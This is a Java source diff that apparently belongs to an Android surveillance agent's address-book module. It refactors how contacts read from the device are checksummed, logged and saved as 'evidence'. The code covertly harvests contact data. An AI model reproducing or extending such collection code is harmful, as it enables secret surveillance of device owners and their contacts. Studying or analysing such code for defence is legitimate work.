@@ -29,6 +29,7 @@ import com.ht.RCSAndroidGUI.agent.task.PickContact;
 import com.ht.RCSAndroidGUI.agent.task.PostalAddressInfo;
 import com.ht.RCSAndroidGUI.agent.task.UserInfo;
 import com.ht.RCSAndroidGUI.agent.task.WebsiteInfo;
+import com.ht.RCSAndroidGUI.crypto.Encryption;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.evidence.Markup;
 import com.ht.RCSAndroidGUI.util.Check;
@@ -42,7 +43,7 @@ public class AgentTask extends AgentBase {
 
 	Markup markup;
 	
-	HashMap<Long, Integer> contacts; // (contact.id, contact.pack.crc)
+	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
 
 	public AgentTask() {
 
@@ -67,7 +68,7 @@ public class AgentTask extends AgentBase {
 		// the markup exists, try to read it
 		if (markup.isMarkup()) {
 			try {
-				contacts = (HashMap<Long, Integer>) markup.readMarkupSerializable();
+				contacts = (HashMap<Long, Long>) markup.readMarkupSerializable();
 			} catch (IOException e) {
 				Log.d("QZ", TAG + " Error (begin): cannot read markup");
 			}
@@ -75,7 +76,7 @@ public class AgentTask extends AgentBase {
 
 		// if no markup available, create a new empty one
 		if (contacts == null) {
-			contacts = new HashMap<Long, Integer>();
+			contacts = new HashMap<Long, Long>();
 			serializeContacts();
 
 		}
@@ -88,7 +89,8 @@ public class AgentTask extends AgentBase {
 		Check.ensures(contacts != null, "null contacts");
 		
 		try {
-			markup.writeMarkupSerializable(contacts);
+			boolean ret = markup.writeMarkupSerializable(contacts);
+			Check.ensures(ret,"cannot serialize");
 		} catch (IOException e) {
 			Log.d("QZ", TAG + " Error (serializeContacts): " + e);
 		}
@@ -116,8 +118,10 @@ public class AgentTask extends AgentBase {
 
 			// calculate the crc of the contact
 			byte[] packet = preparePacket(c);
-			Integer crcOld = contacts.get(c.getId());
-			Integer crcNew = crc(packet);
+			Log.d("QZ", TAG + " (go): " + Utils.byteArrayToHex(packet));
+			Long crcOld = contacts.get(c.getId());
+			Long crcNew = Encryption.CRC32(packet);
+			Log.d("QZ", TAG + " (go): " + crcOld + " <-> " + crcNew);
 
 			// if does not match, save and serialize
 			if (!crcNew.equals(crcOld)) {
@@ -129,20 +133,11 @@ public class AgentTask extends AgentBase {
 		}
 
 		if (needToSerialize) {
+			Log.d("QZ", TAG + " (go): serialize contacts");
 			serializeContacts();
 		}
 	}
 
-	/**
-	 * Standard crc
-	 * @param packet
-	 * @return
-	 */
-	private int crc(byte[] packet) {
-		CRC32 crc = new CRC32();
-		crc.update(packet);
-		return crc.hashCode();
-	}
 
 	/**
 	 * Save evidence
@@ -151,7 +146,7 @@ public class AgentTask extends AgentBase {
 	private void saveEvidence(Contact c) {
 
 		byte[] packet = preparePacket(c);
-		contacts.put(c.getId(), crc(packet));
+		contacts.put(c.getId(), Encryption.CRC32(packet));
 
 		LogR log = new LogR(EvidenceType.ADDRESSBOOK);
 		log.write(packet);
@@ -204,11 +199,8 @@ public class AgentTask extends AgentBase {
 		Check.asserts(db_header.getPosition() == 12, "getContactPayload db_header.getLength: " + header.length);
 
 		final byte[] packet = Utils.concat(header, 12, payload, payload.length);
-
 		Check.ensures(packet.length == size, "getContactPayload packet.length: " + packet.length);
-
 		return packet;
-
 	}
 
 	private void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
